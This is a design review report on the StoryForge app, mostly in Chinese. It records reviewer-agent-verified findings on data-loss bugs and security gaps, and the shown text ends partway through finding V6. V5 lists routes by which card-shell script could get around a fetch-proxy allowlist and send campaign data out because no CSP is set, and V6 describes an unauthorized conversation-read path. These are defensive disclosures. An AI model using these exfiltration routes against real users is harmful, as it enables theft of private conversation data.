# StoryForge 架构与设计评审报告

> 状态：评审报告（2026-07-26），**只记录、未改代码**
> 方法：7 个维度分析 agent 全量读代码产出 65 条发现 → 其中最重要的 8 条各由 1 个独立 agent 以"默认试图驳倒"的立场对抗核实（读原文件逐条验证行号与断言）→ 人工综合
> 核实结果：7 条完全确认、1 条部分确认、0 条被驳回
> 代码基线：main @ d36d433 + 当时未提交的 card-shell WIP（+958/−65，12 文件 + 6 个 untracked 源/测试文件）
> 附录 B/C 的发现**未经逐条对抗核实**，方向可信、细节引用前应先复核

---

## 结论先讲

**架构骨架符合项目给自己定的要求，不需要重构方向；但"规则覆盖到的地方做得好，规则没覆盖的地方正在腐化"是贯穿所有维度的模式。**

- 写进文档的红线全部经代码核实成立：分层硬规则、纯快照下传、取消传播、信息隔离、iframe 沙箱。
- 没有红线保护的地方在积累债：lib.rs 单体化（21,060 行）、JSON/SQLite 双实现漂移、卡壳特例硬编码进通用层、权威文档失去同步。
- 核实确认了 **2 个正在发生的数据丢失 bug（V1/V2）、1 个真相源分裂（V3）、1 个断电可清空存档的持久化缺陷（V4）、2 个违反自定硬约束的安全缺口（V5/V6）**——这些不是理论风险。

### 对"是否符合要求"的直接回答

| 项目自定要求 | 现状 |
| --- | --- |
| app-agent 不依赖 tauri-app；CampaignStore 不进 ToolContext；纯快照下传 | ✅ 全部经代码核实成立 |
| Agent 输出持久化前结构化校验、名字归一到 instance id | ⚠️ 主路径成立，但 V1/V2 两个缺口让 regenerate 轮与临场角色的知识写回静默丢失 |
| Campaign 是运行时真相源 | ⚠️ 主链路成立；V3 开场选择不落盘是已确认的违反 |
| 卡壳"远程资源宿主代持（allowlist + 缓存）" | ❌ V5：CSP 为 null，代持只是 fetch monkey-patch，卡 JS 可绕过直连网络——纸面成立 |
| 卡脚本不与主应用 same-origin | ✅ opaque origin 成立 |
| Meta 是维护层不抢写作职责 | ✅ 成立 |
| Android-first | ❌ 方向性偏离：停在 ~20% 已三周，近月投入全是桌面 WebView2 特化；V4 的 fsync 缺陷恰在 Android 上最致命 |

---

## 一、经核实符合要求的部分

- **分层硬规则真实成立**：app-agent 的 Cargo.toml 无 tauri-app 依赖；ToolContext 里没有 CampaignStore，只有 `Option<Arc<CampaignRuntimeContext>>`；`crates/domain/src/campaign_runtime.rs` 是零 store/lock/Tauri 类型的纯快照。依赖图无环、层次正确（domain → infra-* → app-* → tauri-app；harness-real-llm → tauri-app 是叶子测试装置，方向安全）。
- **Turn 提交核心是认真工程**：revision CAS、TurnRecord 预写日志 + 保守启动重放、三态幂等 upsert、写前预演、create_campaign_with_instances 补偿回滚、fail-closed JSON→SQLite cutover（marker 即提交点、临时库、校验、不碰源数据）。
- **流水线失败语义正确**：操作级取消（WritingCancelHandle generation-id 比较）贯穿到 SSE 读循环与重试层；子 Agent 信号量限流 + JoinHandle panic 隔离 + 单独失败不拖垮整轮（全失败才 abort）；postprocess best-effort 且 PostProcessSkipped 与 Failed 区分清楚；postprocess 后台任务取得 orchestrator 所有权，pending_temporary_instances/session 不构成跨请求共享可变状态。
- **安全面有真功夫**：卡壳 iframe `sandbox="allow-scripts"` + blob URL = opaque origin，触不到 app DOM 和 `__TAURI_INTERNALS__`；bridge 回调按 campaign 硬绑定而非信任参数（shell_variables_set 只写 props.campaignId，worldbook 名称硬断言），跨 Campaign 投毒被结构性阻断；storyforge-cache 协议只接受 sha256 派生的不透明文件名、拒绝路径穿越；重定向逐跳重验 + 拒绝 IP 直连；密钥走 OS keyring SecretRef、从不回传前端、日志/导出均有脱敏；**Director/Subagent 全部工具只读**，恶意卡通过提示注入能"说"不能"写"，爆炸半径天然小；无任何 Tauri 命令从前端接收文件系统路径。
- **前端三层解耦基本成立**：design/ 层 24 处 import 中 23 处纯净；adapter 按 CONTRACT.md 映射；7 个 cardShell*.js 纯函数抽取方向正确且全部有 node 测试。
- **证据文化罕见地诚实**：拒绝把 partial 写成 PASS、拒绝把 synthetic fixture 写成生产验收，在 workstream 文档里执行一致。

---

## 二、经对抗核实确认的高危问题

### V1. Regenerate postprocess always runs with empty present_chars, silently dropping knowledge writes

- **维度 / 严重度**：多 Agent 流水线与运行时 / 高
- **对抗核实结论**：确认

**证据**：crates/app-pipeline/src/lib.rs:1134 is the ONLY assignment of self.session (inside start_writing); regenerate() never sets it. The Tauri regenerate command constructs a fresh PipelineOrchestrator (crates/tauri-app/src/lib.rs:5392-5393) then derives present_chars from pipeline.session() (lib.rs:5488-5501), which is always None after regenerate -> present_chars = []. Empty present set then hard-rejects Witnessed/Inferred knowledge in normalize_knowledge_update_for_postprocess (tauri-app/src/lib.rs:4884-4886, comment: "空集时 Witnessed/Inferred 也拒绝") and is also passed into the postprocess agent prompt and MVU fragment collection (lib.rs:5504-5505, 5582).

**问题与失效模式**：Every regenerate in Campaign mode runs the postprocess pipeline with an empty present-characters list: witnessed/inferred character knowledge extracted from the regenerated draft is dropped with only a tracing warn, MVU fallback fragments scoped to present characters are not collected, and the postprocess LLM prompt loses its character list. The user sees a successful turn; the memory system silently loses that turn's writes. This is a direct failure mode of relying on orchestrator mutable state (session) that only one of two entry paths populates.

**建议**：Derive present_chars from the data regenerate already returns: provenance.plan.subagent_tasks (the provenance is in hand at tauri-app lib.rs:5406). Alternatively have regenerate() populate self.session like start_writing does. Add a test asserting non-empty present_chars reaches run_postprocess after a Campaign-mode regenerate.

<details><summary>核实过程记录（独立验证 agent）</summary>

Checked every cited location plus surrounding code; the claim holds end-to-end.

1) Session population: grep over crates/app-pipeline/src/lib.rs shows exactly one assignment of self.session, at line 1134, inside start_writing (fn spans 723-1150). regenerate (line 1367+) never sets it, and its shared helper run_editor_and_commit (line 1990+, returns at 2156) commits the variant without touching session. regenerate_all (1347) does delegate to start_writing, but the only production call sites of .regenerate( are the Tauri regenerate command (tauri-app/src/lib.rs:5395) and the quality-gate autofix (production_postprocess.rs:239) — neither uses regenerate_all. session is initialized to None in the constructor (app-pipeline lib.rs:645).

2) Tauri regenerate command (single command, lib.rs:5278-5605): constructs a fresh PipelineOrchestrator at 5392-5393 (new_pipeline_with_regex_and_prompt_hook -> new_with_sampling, session: None), then derives present_chars from pipeline.session() at 5488-5501 with .unwrap_or_default(). Since regenerate never populates session, present_chars is always [] on this path, in Campaign mode included. The empty list is then used for MVU fragment collection (5505) and passed into run_shared_postprocess_background (5582), which forwards it verbatim to run_postprocess (3027) and apply_outcome (3054/3066).

3) Empty-set consequences confirmed in BOTH persistence backends: JSON path normalize_knowledge_update_for_postprocess (lib.rs:4884-4901) hard-rejects Witnessed/Inferred when present_ids.is_empty() with only a tracing::warn; the sqlite/runtime mutation-batch path (production_postprocess.rs:1184-1195) silently `continue`s with no log at all — even more silent than the claim states. ToldByOther/Backstory and broadcast knowledge remain exempt, and instance-variable writes survive via the empty-set escape hatch in is_postprocess_instance_present (lib.rs:5134-5141) — the claim correctly scoped the loss to Witnessed/Inferred knowledge. collect_mvu_fallback_fragments iterates present_chars, so [] yields no fragments (JSON backend; on sqlite MVU fragments are skipped unconditionally, a minor moot point). The postprocess prompt renders 【在场角色】（无） when the list is empty (app-agent/src/prompts/postprocess.rs:175-179), so the extraction LLM is literally told no one is present on every regenerate.

4) Mitigations searched, none found: apply_outcome/build_mutation_batch never re-derive presence from the attempt's stored provenance; no doc or test acknowledges the regenerate interaction. Existing test postprocess_empty_present_chars_rejects_witnessed_knowledge (lib.rs:17830) and docs (HARNESS-FINDINGS P3, HANDOFF-W3-P3P4) show the empty-set rejection was a deliberate tightening — designed against a hypothetical no-plan case — which makes regenerate feeding a guaranteed-empty set a real, undocumented failure mode rather than intended behavior. Corroborating the root cause: the quality-gate NarrativeContract is also built from pipeline.session() (production_postprocess.rs:202-210), so regenerate additionally runs the quality gate contract-less (beyond the claim's scope, same one-path-populates-state flaw).

5) Recommendation feasibility checked: regenerate returns Provenance built with Some(plan.clone()) (run_editor_and_commit, app-pipeline lib.rs:2103-2105), and the Tauri command already destructures it at 5406, so deriving present_chars from provenance.plan.subagent_tasks would work for all three re-roll granularities.

Severity: high is proportionate. Every Campaign-mode regenerate (a mainline user flow: re-roll then accept) permanently loses that turn's Witnessed/Inferred knowledge writes with no user-visible signal — a silent data-integrity failure in the Campaign runtime source of truth, architectural in origin (mutable orchestrator state populated by only one of two entry paths). Only softening nuances: variable/task/summary writes and presence-exempt knowledge still land, and the MVU-fragment loss is JSON-backend-only; none of these were misclaimed.

</details>

---

### V2. A.1 temp-instance redesign reintroduced the Phase-6 bug CLAUDE.md claims is fixed: postprocess skips this-turn temporary characters

- **维度 / 严重度**：多 Agent 流水线与运行时 / 高
- **对抗核实结论**：确认

**证据**：crates/tauri-app/src/lib.rs:2605 comment: "A.1：临时 instance 不再在 accept 前直接写 Campaign；挂在 Attempt，accept 时 Mutation 落盘"; persist_temporary_instances_async is now #[allow(dead_code)] "保留给单测" (lib.rs:4454-4476). But postprocess target resolution still reads only persisted instances: production_postprocess.rs:939 (store.list_instances) and normalize_knowledge_update_for_postprocess skips unresolvable targets (tauri-app/src/lib.rs:4862-4870). Postprocess runs in background right after DraftReady (lib.rs:2691-2709), i.e. BEFORE accept lands the UpsertInstance mutations. CLAUDE.md "Current Code Facts" still states: "Phase 6: temporary instances are persisted before postprocess runs, so their knowledge/variables are no longer skipped".

**问题与失效模式**：Knowledge and variable updates that the postprocess agent produces for a temporary (ad-hoc) character created this turn cannot resolve to any persisted instance at postprocess time, so they are warn-and-skipped and never enter the MutationBatch that lands at accept. The skip is permanent, not deferred. This both loses data for the ad-hoc character flow (a flow the project explicitly evaluated and committed to) and contradicts a stated Current Code Fact — per the project's own rules this doc/code conflict should have been reported, not silently landed.

**建议**：Make the postprocess resolver consult the active attempt's pending_temporary_instances in addition to store.list_instances (they carry final instance ids already), or defer normalization of unresolved targets into the accept-time mutation application where temps exist. Update the CLAUDE.md Phase 6 fact to the A.1 semantics either way.

<details><summary>核实过程记录（独立验证 agent）</summary>

Checked all cited code plus surrounding flow. Confirmed: (1) Commit 0dfca29 (A.1) removed persist_temporary_instances_async calls from start_writing/regenerate; the deleted comment explicitly said temps were persisted before postprocess "so knowledge/variable writes can find them". The function is now #[allow(dead_code)] test-only (lib.rs:4457-4476); temps ride on the TurnAttempt and land only via Mutation::UpsertInstance prelude in prepare_commit_batch at accept (turn_lifecycle.rs:95-109). (2) Postprocess batch construction runs before accept (background tokio::spawn after DraftReady, lib.rs:2691-2709; regenerate awaits it at 5578 but still pre-accept) and resolves targets against a temp-less view: JSON path via store.list_instances/find_instance_by_name_or_id with warn-and-skip (production_postprocess.rs:939, lib.rs:4862-4870; variable updates silently dropped at production_postprocess.rs:977-993). (3) The skip is permanent: the batch becomes attempt.pending_state_changes and accept adds only UpsertInstance+FinalizeVariant; no deferred re-normalization exists; no production code consults attempt.pending_temporary_instances during batch building. (4) CLAUDE.md still asserts the pre-A.1 Phase 6 fact, so code now contradicts a stated Current Code Fact. The claim is actually slightly UNDERstated: the SQLite path is equally broken — build_runtime_mutation_batch (production_postprocess.rs:1041-1199) resolves against pp_runtime = ctx.campaign_runtime, which is the pre-turn snapshot (set only in fill_campaign_context, lib.rs:4099/4346); the temp-including effective_runtime from with_temporaries_for is local to the pipeline stage (app-pipeline/src/lib.rs:906-916) and never propagated, and that path skips silently without even a warning. The prepare_commit_batch comment "Temporary instances must exist before state/knowledge mutations can target them" shows the ordering was designed for temp-targeted mutations that the builders can in fact never produce — a missed wiring, not an intentional drop. No mitigation found anywhere. Severity high is proportionate: violates a stated project fact/requirement (CLAUDE.md Phase 6 fact + the "report doc/code conflicts" rule), and permanently loses postprocess knowledge/variable state for this-turn ad-hoc characters — a flow the project explicitly evaluated and committed to.

</details>

---

### V3. Opening-shell scenario selection is never persisted — UI diverges from the Campaign conversation (stated source of truth)

- **维度 / 严重度**：前端架构 / 高
- **对抗核实结论**：确认

**证据**：frontend/src/AppV2.vue:397-442 onOpeningShellApplied: for Campaign mode (non-legacy) it rewrites writing.messages[0] variants/content in place ("Prefer rewriting the first assistant opening in-place so the chosen scenario is visible now") and calls no tauri-api persistence command. frontend/src/composables/useWriting.js:80,137 shows startWriting sends only (intent, charId, onEvent) — the backend assembles context from its own conversation store. The conversation was created earlier with the form-selected greeting (useNewCampaignForm.js:112-116 createCampaign(..., selectedNewCampaignGreeting?.content)).

**问题与失效模式**：When the user finishes the card's opening setup (e.g. Destiny「开始旅程」) and picks a different scenario than the one the Campaign was created with, only the frontend message array changes. The persisted conversation keeps the original opening, so (a) the next writing turn's backend context is built on the un-chosen scenario, and (b) any reload/openConversation (applyConversation pulls from getConversation) silently reverts the visible opening. This directly contradicts "Campaign is the runtime source of truth" and loses a user decision without any error.

**建议**：Persist the selection before disarming the shell: either reuse the existing message-variant edit/switch Tauri command (the same path handleEditVariant/handleSwitchVariant use) to write the chosen content into the first conversation node, or add a small apply_opening_selection command. Treat the local rewrite as optimistic UI only, applied after the backend write succeeds.

<details><summary>核实过程记录（独立验证 agent）</summary>

Checked the full path from shell selection to persistence and back. Findings:

1) Local-only rewrite confirmed. AppV2.vue:397-442 onOpeningShellApplied: for Campaign mode (non-legacy) it only mutates writing.messages[0] variants/content in memory, calls broadcastChatChanged (a plugin event broadcast, not persistence) and disarmCardShellOpening. No tauri-api invoke anywhere in that path. The disarm watch (AppV2.vue:216-221) persists nothing either.

2) The shell's own saveChat is a no-op — a mitigation candidate the claim didn't mention, and it does NOT mitigate. The card calls SillyTavern.saveChat() before reloadCurrentChat (documented in frontend/src/utils/cardShellOpeningChat.js:1-8). CardShellHost.vue:948-955 creates the host handler via createHostHandler with only isTrustedSource — no saveChatAdapter — so chat.save falls through to the degraded default adapter in frontend/src/utils/pluginPersistence.js:80-83, which returns { ok: true, degraded: true, reason: 'local_mirror_only_no_host_persist' } without writing anything. The opening_chat_applied bridge message (CardShellHost.vue:594-613, 908-918) only emits 'opening-applied' to the host.

3) Persisted conversation keeps the form-time greeting. useNewCampaignForm.js:112-116 passes selectedNewCampaignGreeting?.content to createCampaign; backend create_campaign_in_store (crates/tauri-app/src/lib.rs:9665-9702) appends it as the first assistant node via conv_store.append_final_message. Nothing ever updates that node from the shell selection.

4) Next-turn backend context uses the un-chosen opening — confirmed. start_writing (lib.rs:2386+) overrides the frontend-passed conversation_id with the Campaign-bound one (prepare_start_conversation_async, lib.rs:2412-2425), and Director/Editor history is assembled server-side from conv_store.recent_history_with_epoch (crates/app-pipeline/src/lib.rs:788, 1026, 1480, 2036). openingMessage is only sent for legacy mode with no existing conversation (useWriting.js:134-136), never for Campaign mode.

5) Revert is even more immediate than the claim states: not just on reload/openConversation. After the very first writing turn, useWriting.js:151-153 refetches getConversation and calls applyConversation(refreshed), which rebuilds writing.messages entirely from backend nodes (useConversation.js:42-54) — silently discarding the shell-chosen opening the moment the first turn completes, and that turn's LLM context already contained the stale opening.

Minor citation inaccuracy (does not change substance): the claim says startWriting sends only (intent, charId, onEvent); the API actually takes 5 params including conversationId and openingMessage (tauri-api.js:500-513). But in Campaign mode openingMessage is always null and the backend overrides conversationId anyway, so the substantive point (backend assembles context from its own store) is exactly right. The legacy branch (greeting.selectGreeting at AppV2.vue:402-403) does effectively carry the choice into the first legacy turn via openingMessage, so the claim correctly scopes the defect to Campaign mode.

Severity: high is proportionate. Project CLAUDE.md states "Campaign is the runtime source of truth"; this path makes the UI silently diverge from that source of truth, feeds the LLM a scenario the user rejected, and loses a user decision with no error — a stated-requirement violation plus silent loss of user data (the decision), not mere design debt. Recommendation is sound in spirit; note the first node is stored via append_final_message with a single variant, so switch_variant (tauri-api.js:650) alone won't suffice — an edit-variant write or a dedicated apply_opening_selection command is needed.

</details>

---

### V4. atomic_write provides no crash durability (no fsync) and degrades to a non-atomic direct write; corrupt loads silently continue with an empty store

- **维度 / 严重度**：数据模型与状态一致性 / 高
- **对抗核实结论**：确认

**证据**：crates/infra-util/src/lib.rs:22-36 — `atomic_write` does `std::fs::write(tmp)` then `rename`, with no fsync of the temp file or parent directory; on rename failure it falls back to `std::fs::write(path, bytes)` directly on the live file ("回退直接写"). All persistence flows through this: campaign_store.rs:1210-1216 `persist()`, turn_store.rs:204-210 `persist_turns()`. On load, campaign_store.rs:1192-1208 `load_or_default` / json_store `load_json_with_tmp_backup_or_default` copies a `.corrupt` backup and returns an empty Vec, and the app continues normally (verified by test `test_campaigns_copies_corrupt_backup_when_main_and_tmp_are_invalid`, campaign_store.rs:1294-1312).

**问题与失效模式**：The turn barrier's stated guarantee (turn_store.rs header: "在任何副作用发生前，Prepared MutationBatch 已原子落盘") only holds for process crashes. On an OS crash or power loss, rename-without-fsync can leave a zero-length or torn campaigns.json/turns.json with no .tmp to recover from (the successful rename consumed it) — a classic ext4/f2fs hazard that is specifically realistic on Android, the project's stated primary target. The recovery behavior then compounds it: the loader silently substitutes an empty collection, the next successful persist writes that empty state durably, and the user's campaigns/turn journal are gone except for a manually-recoverable .corrupt file no UI surfaces. This is a data-loss risk that undercuts the otherwise careful CAS/journal design.

**建议**：In `atomic_write`: fsync the temp file before rename and fsync the parent directory after rename on Unix (Android); remove the direct-write fallback or replace it with retry-with-backoff plus a hard error (Windows sharing violations should surface, not silently degrade atomicity). On corrupt load of campaigns/turns/instances, fail startup into an explicit recovery prompt instead of silently continuing with an empty default.

<details><summary>核实过程记录（独立验证 agent）</summary>

Checked: crates/infra-util/src/lib.rs (atomic_write, lines 22-36), crates/tauri-app/src/json_store.rs (load_json_with_tmp_backup_or_default), crates/tauri-app/src/campaign_store.rs (load_or_default 1192-1208, persist 1210-1216, tests 1271-1312), crates/tauri-app/src/turn_store.rs (header line 9, persist_turns 204-210), a workspace-wide grep for sync_all/sync_data/fsync, a grep for .corrupt surfacing in frontend/src, and crates/tauri-app/src/storage_backend.rs + sqlite_runtime.rs + infra-sqlite/src/connection.rs for the SQLite opt-in path.

All cited facts verified: (1) atomic_write does fs::write(tmp) + rename with zero fsync calls — the only sync_all/sync_data in the workspace are in harness-real-llm (test-evidence harness), none in the production persistence path; (2) on rename failure it falls back to fs::write directly on the live file (lib.rs:30-33); (3) campaign_store::persist and turn_store::persist_turns (and connection/module/preset/regex/storage stores) all route through atomic_write_json; (4) on corrupt load, json_store tries .tmp, then copies .corrupt and returns T::default() (empty Vec) with only a tracing::error — no UI or Tauri command surfaces .corrupt (frontend grep found nothing), and tests explicitly enshrine the silent-empty behavior; (5) turn_store.rs:9 states the durability guarantee verbatim ("在任何副作用发生前，Prepared MutationBatch 已原子落盘"), which rename-without-fsync cannot deliver under power loss; (6) the compounding failure is real: after a torn/zero-length main file (the .tmp was consumed by the successful rename), the loader returns empty and the next persist overwrites main with the empty state, leaving only the un-surfaced .corrupt copy. Notably, infra-util's own module doc says atomic_write exists to prevent the historical "被 unwrap_or_default() 静默清空用户数据" bug — the power-loss variant of exactly that bug remains.

Nuances the claim missed (none downgrade it): (a) in the rename-failure fallback path specifically, the .tmp is NOT consumed and holds the full new bytes, so a process crash mid-fallback-write is recoverable via the .tmp loader path — the fallback is less catastrophic than the flat "non-atomic direct write" phrasing implies, though still not power-loss durable since the .tmp itself was never fsynced; (b) an opt-in SQLite backend exists (storage_backend.rs, WAL + synchronous=NORMAL, fail-closed cutover, no JSON fallback) that would largely fix durability, but storage_backend.rs:4-5 states "JSON remains the production default", so the mainline path is exactly as claimed; (c) "the project's stated primary target" for Android is a slight overstatement — Android is a stated first-class release target (ROADMAP Phase 6, RELEASE-CHECKLIST Android acceptance matrix A1-A7) alongside Windows desktop, which is sufficient for the ext4/f2fs hazard to be realistic.

Severity high is proportionate: it is a genuine data-loss risk (user campaigns/turn journal silently replaced by empty state after power loss) and contradicts a stated design guarantee in turn_store's header and infra-util's own rationale, meeting the "architectural/data-loss risk" bar. The recommendation (fsync temp + parent dir, replace silent fallback, explicit recovery on corrupt load) is consistent with what the code shows.

</details>

---

### V5. No CSP anywhere: the card-shell allowlist is not an egress boundary, contradicting the stated "remote resources host-mediated" constraint

- **维度 / 严重度**：安全架构 / 高
- **对抗核实结论**：确认

**证据**：`crates/tauri-app/tauri.conf.json:20-21` sets `"security": { "csp": null }`. `frontend/src/utils/cardShellFetchProxy.js:55-64` implements host mediation purely as `window.fetch = function(input, init){...}`. `frontend/src/components/CardShellHost.vue:190-197` (`setFrameHtml`) loads the card document from a parent-created `blob:` URL, which inherits the creator's CSP — and there is none. The stated constraint is `docs/workstreams/CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md:11`: "主应用 **不** 与卡脚本 same-origin；远程资源 **宿主代持**（allowlist + 缓存）"; the pre-rewrite design named CSP explicitly (`docs/archive/2026-06-16-pre-rewrite/INTENT.md:176`, "iframe 沙箱 + CSP + 白名单 API").

**问题与失效模式**：A `sandbox="allow-scripts"` iframe is origin-isolated but is *not* network-isolated; sandbox does not restrict outbound requests. Only CSP does. Because `csp` is null, card script can bypass `cardShellFetchUrl` entirely with `XMLHttpRequest`, `new Image().src`, `navigator.sendBeacon`, `document.createElement('script').src`, `WebSocket`, or `fetch.call(window, ...)` recovered from a nested about:blank frame. That means (a) `card_shell_cache.rs::validate_fetch_url` and the allowlist constrain nothing an attacker cares about, so the host-mediation requirement is satisfied on paper only, and (b) anything the card *can* read through the legitimate bridge — campaign variables via `getVariables`, worldbook entry titles via `campaign_worldbook_get`, plus conversation bodies via the IPC reach in the next finding — leaves the device to an arbitrary server. It also means the card can load remote code from a non-allowlisted host, defeating the purpose of the cache/allowlist as a supply-chain control.

**建议**：Set an explicit `app.security.csp` in `tauri.conf.json` with a `default-src 'self'` baseline plus `connect-src`/`img-src`/`script-src` limited to `'self' storyforge-cache: data: blob:` (Tauri already needs `ipc:`/`asset:` entries — use `dangerousDisableAssetCspModification: false` and let Tauri inject them). Verify inheritance actually reaches the blob iframe on WebView2 and Android WebView; if inheritance is unreliable there, emit an explicit `<meta http-equiv="Content-Security-Policy">` as the first child of `<head>` in `wrapRemoteHtml` (`CardShellHost.vue:719-731`) so the shell document carries its own policy. Until that lands, downgrade the wording in `CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md:11` from a hard constraint to "routing only" so the doc does not overstate the guarantee.

<details><summary>核实过程记录（独立验证 agent）</summary>

WHAT I CHECKED (all cited anchors verified, plus surroundings):

1. `crates/tauri-app/tauri.conf.json:20-21` — literally `"security": { "csp": null }`. Grep for `csp|Content-Security-Policy` across `crates/` returns exactly one hit: that line. No `devCsp`, no `dangerousDisableAssetCspModification`, no `on_web_resource_request` / `on_navigation` / `initialization_script` anywhere in the workspace (grepped repo-wide). Confirmed.

2. No CSP meta anywhere on the frontend side either — grep for `http-equiv|Content-Security-Policy` over `frontend/` (incl. `*.html`) returns zero matches. `frontend/index.html` has no policy. `wrapRemoteHtml`'s `headInject` (CardShellHost.vue:719-730) injects base tag + 6 script blocks and no meta. Confirmed.

3. `frontend/src/utils/cardShellFetchProxy.js:55-64` — the only network mediation is `window.fetch = function(input, init){...}`, and it only diverts URLs matching `/^https?:\/\//i`. No `XMLHttpRequest`, `WebSocket`, `sendBeacon`, `EventSource`, or `Image` override in that file or in `cardShellDocument.js`. Notably the sibling hidden runtime DOES attempt this (`MvuJsRuntime.vue:203-205` nulls out `fetch`/`XHR`/`WebSocket`) — the visible shell does not, so the asymmetry is deliberate-looking but leaves the visible shell wide open. Confirmed.

4. `CardShellHost.vue:190-197` `setFrameHtml` — parent creates `new Blob([html])` + `URL.createObjectURL`, iframe is `sandbox="allow-scripts"` (line 30). Sandbox gives an opaque origin, not network isolation. Blob documents inherit the creator's policy container (incl. CSP) in Chromium/WebView2/Android WebView, so today they inherit "no policy". Confirmed.

5. Doc anchors are accurate: `CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md:11` sits under a 硬约束 heading and says 远程资源宿主代持（allowlist + 缓存）; archived `INTENT.md:176` names CSP explicitly.

EVIDENCE THE CLAIM MISSED THAT MAKES IT *STRONGER*:
- Host mediation is already only partial by construction, not just bypassable. `rewriteModuleScriptsInHtml` (CardShellHost.vue:296-341) explicitly `continue`s on any module script that has `src=` (line 310), and nothing rewrites `<img src>`, `<link rel=stylesheet>`, or classic `<script src>`. `cardShellDocument.js` has zero `img`/`link` handling. Combined with the injected `<base href="<remote origin>">` (line 373), a card's plain markup resolves and loads straight from the network with no allowlist and no cache — the attacker doesn't even need a bypass trick, the ordinary HTML path is already unmediated.
- The card reaches real IPC: `createHostHandler(shellVirtualPlugin, invoke, ...)` (CardShellHost.vue:948) with a `isTrustedSource` that returns true for any message carrying `pluginId === shellPluginId`; the handler ends in `await invoke(method.command, params)` (plugin-bridge.js:1846) behind a method map + permission check. So the read-then-exfiltrate chain the claim describes is real.
- Pre-existing known issue, deferred not fixed: archived `docs/archive/2026-06-16-pre-rewrite/FINAL-AUDIT-REPORT.md:158` "H-13. CSP 禁用", line 27 says "H-13 CSP 待 Android 阶段处理". So the project already logged it and shelved it — no mitigation landed.

WHERE THE CLAIM OVERSTATES (does not change the verdict):
- "`validate_fetch_url` and the allowlist constrain nothing an attacker cares about" is too strong. `card_shell_cache.rs:122-131` also rejects IP-literal hosts and localhost (test at :604 asserts `http://127.0.0.1/internal` errors), which is host-side SSRF containment for the *Rust* fetcher — something CSP can never provide, since that request originates in the host process, not the WebView. The allowlist genuinely fails as a card-egress boundary; it is not worthless.
- The recommended policy as written would break the shell. `default-src 'self'` + `script-src 'self' storyforge-cache: data: blob:` blocks every injected inline script in `headInject`, the `s.text = code` classic-script injection used by the jQuery/Vue/EJS/lodash preloader (CardShellHost.vue:548-555, 625-628), and any `new Function`/eval inside card code. A workable policy is `script-src 'unsafe-inline' 'unsafe-eval' blob: data:` (script-src is not where the egress win is) with the real tightening on `connect-src` / `img-src` / `media-src` / `form-action` / `frame-src`. Even then it collides with the doc's other 硬约束 at line 9 (不接受降级), because cards with direct remote `<img>`/`<link>` will visibly break until those are rewritten through the cache. So the fix is a real workstream, not a one-line config edit.

SEVERITY: high is proportionate. It is a security risk (silent exfiltration of campaign variables/worldbook/IPC-reachable data to an arbitrary server, plus remote code execution from non-allowlisted hosts, defeating the cache/allowlist as a supply-chain control) AND it contradicts a doc-level 硬约束. Mitigating context that argues toward medium but not enough to move it: cards are content the user chose to import, and SillyTavern itself runs them same-origin, so StoryForge is not worse than baseline — but StoryForge's own docs promise better, and the opaque-origin sandbox creates a false impression that the boundary exists.

</details>

---

### V6. Card shell self-grants a virtual-plugin permission set and reaches `get_conversation`, a Tauri command with no backend authorization

- **维度 / 严重度**：安全架构 / 高
- **对抗核实结论**：部分确认（核实者认为严重度评级可商榷）

**证据**：`frontend/src/components/CardShellHost.vue:122-133` constructs `shellVirtualPlugin = { id: 'card-shell-'+random, permissions: ['ReadVariables','WriteVariables','ReadMemory','ReadCharacter','ModifyPrompt','Generate'] }` and `:948` wires it to the real IPC bridge via `createHostHandler(shellVirtualPlugin, invoke, ...)`. `frontend/src/plugin-bridge.js:185` maps `'memory.getRecent'` to the plain command `get_conversation` with `params: (p) => ({ id: p.conversationId })`, and the only gate is the host-side `hasAnyPermission` check at `:1833-1841`. `crates/tauri-app/src/lib.rs:6337-6351` (`fn get_conversation`) takes an arbitrary `id: String` and performs no plugin/permission check whatsoever. Contrast the `plugin_*` commands at `lib.rs:1794-1909`, which all call `state.plugin_registry.ensure_permission(...)`, and `crates/infra-plugin-host/src/lib.rs:227-249`, which rejects an unregistered plugin id — the mechanism exists, it is simply not applied to these two routes.

**问题与失效模式**：Card JS runs in the untrusted iframe but knows `shellPluginId` (it is injected into its own bridge as `window.storyforge.pluginId`, `plugin-bridge.js:1457`), so `window.storyforge.memory.getRecent(id)` is directly callable and returns a full `ConversationDisplayDto` — every user and assistant message of that conversation. The `card-shell-*` id is not in `PluginRegistry`, so the `plugin_*` routes correctly fail closed; `memory.getRecent` and `llm.generate` are the two API_METHODS that escape that check because they target ordinary commands. `llm.generate` → `start_writing` (`lib.rs:2386`) happens to be blocked for shells only by an accidental string mismatch (the shell declares `'Generate'`, the map requires `'CallLlm'`; likewise `'ReadCharacter'` vs `'ReadCharacters'`) — a typo is currently doing the job of an access control, and any *installed* plugin declaring `CallLlm` can invoke `start_writing` with no backend verification at all. Attack precondition for the read: user imports a malicious card AND the attacker has a conversation Id (UUIDs are not guessable, which bounds it) — but with no CSP the retrieved text exfiltrates in one image request, and the missing backend check is a boundary defect regardless of the id-guessing cost.

**建议**：Two independent fixes. (1) Backend: add a plugin-scoped wrapper — `plugin_get_conversation(plugin_id, conversation_id)` and `plugin_start_writing(plugin_id, ...)` — that calls `ensure_permission` with `Permission::ReadMemory` / `Permission::CallLlm` before delegating, and repoint `API_METHODS` at them so no bridge route reaches an unauthorized command. (2) Frontend: stop fabricating a plugin identity for card shells. Either register a real, user-visible pseudo-plugin so `ensure_permission` governs it, or give `createHostHandler` an explicit allow-list parameter and pass the shell a minimal set (`variables.*` only), rather than a permission array the component writes for itself. While there, normalize the permission vocabulary (`ReadCharacter`→`ReadCharacters`, `Generate`→`CallLlm`) so declared intent and enforced strings cannot silently diverge in the permissive direction next time.

<details><summary>核实过程记录（独立验证 agent）</summary>

WHAT I CHECKED (all citations verified line-accurate)
- frontend/src/components/CardShellHost.vue:122-133 — `shellPluginId = 'card-shell-'+random`, `shellVirtualPlugin.permissions = [ReadVariables, WriteVariables, ReadMemory, ReadCharacter, ModifyPrompt, Generate]`. Confirmed verbatim.
